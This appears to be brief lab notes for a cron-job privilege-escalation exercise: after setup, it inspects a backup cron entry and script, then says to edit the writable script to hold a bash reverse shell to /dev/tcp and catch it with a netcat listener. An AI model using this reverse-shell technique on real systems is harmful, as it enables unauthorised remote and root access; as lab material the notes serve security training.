setup 
git clone 
sudo ./setup_cron.sh

lab writeup 
cat /etc/cron.d/backup
ls -l /opt/backup/task.sh
edit tash.sh (use reverse shell)
e.g. bash -i >& /dev/tcp/ip/port 0>&1
with listener nc -nvlp 4444  
